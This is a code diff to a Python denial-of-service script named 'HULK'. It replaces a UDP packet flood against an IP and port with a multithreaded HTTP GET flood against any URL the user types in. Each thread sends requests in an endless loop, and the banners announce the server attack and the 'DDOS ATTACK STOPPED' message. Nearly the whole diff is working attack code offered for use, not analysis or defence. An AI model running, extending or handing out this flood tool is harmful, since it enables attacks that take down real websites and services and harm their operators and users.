@@ -3,6 +3,7 @@ import sys
 import os
 import time
 import socket
+import requests
 import scapy.all as scapy
 import random
 import threading
@@ -45,49 +46,52 @@ print('''
     *  4. Does HULK suit in villain role, huh?     *
     ************************************************
 	''')
-#Type your ip and port number (find IP address using nslookup or any online website) 
-ip = input(" [+] Give HULK A Target IP : ")
-port = eval(input(" [+] Starting Port NO : "))
-os.system("clear")
-print('''
-    ************************************************
-    *            _  _ _   _ _    _  __             *
-    *           | || | | | | |  | |/ /             * 
-    *           | __ | |_| | |__| ' <              *
-    *           |_||_|\___/|____|_|\_\             *
-    *                                              *
-    *          HTTP Unbearable Load King           *
-    *          Author: Sumalya Chatterjee          *
-    *                                              *
-    ************************************************
-
-	''')
+# Nhập URL và số luồng
+url = input(" [+] Give HULK A Target URL (http://...): ")
 try:
-	validate = ip
-	print(" ✅ Valid IP Checked.... ")
-	print(" [+] Attack Screen Loading ....")
-except ValidationError as exception :
-	print(" ✘ Input a right url")
+    validate(url)
+    print(" ✅ Valid URL Checked.... ")
+    print(" [+] Attack Screen Loading ....")
+except ValidationError as exception:
+    print(" ✘ Input a right url")
+    exit()
 
-#Lets start our attack
+try:
+    num_threads = int(input(" [+] Number of threads: "))
+except Exception:
+    num_threads = 10
+    print(" [!] Invalid input, using 10 threads.")
+
+def attack():
+    sent = 0
+    while True:
+        try:
+            response = requests.get(url)
+            sent += 1
+            print(f"\n [+] Successfully sent {sent} HTTP GET request to {url} - Status: {response.status_code}")
+        except Exception as e:
+            print(f" [-] Error sending request: {e}")
+
 print(" ")
 print("    That's my secret Cap, I am always angry ")
 print(" " )
-print(" [+] HULK is attacking server " + ip )
+print(" [+] HULK is attacking server " + url )
 print (" " )
-time.sleep(5)
-sent = 0
-try :
- while True:
-		sock.sendto(bytes, (ip, port))
-		sent = sent + 1
-		print("\n [+] Successfully sent %s packet to %s throught port:%s"%(sent,ip,port))
-		if port == 65534:
-			port = 1
+time.sleep(3)
+
+threads = []
+try:
+    for i in range(num_threads):
+        t = threading.Thread(target=attack)
+        t.daemon = True
+        t.start()
+        threads.append(t)
+    while True:
+        time.sleep(1)
 except KeyboardInterrupt:
-	print(" ")
-	print("\n [-] Ctrl+C Detected.........Exiting")
-	print(" [-] DDOS ATTACK STOPPED")
+    print(" ")
+    print("\n [-] Ctrl+C Detected.........Exiting")
+    print(" [-] DDOS ATTACK STOPPED")
 input(" Enter To Exit")
 os.system("clear")
 print(" [-] Dr. Banner is tired...")
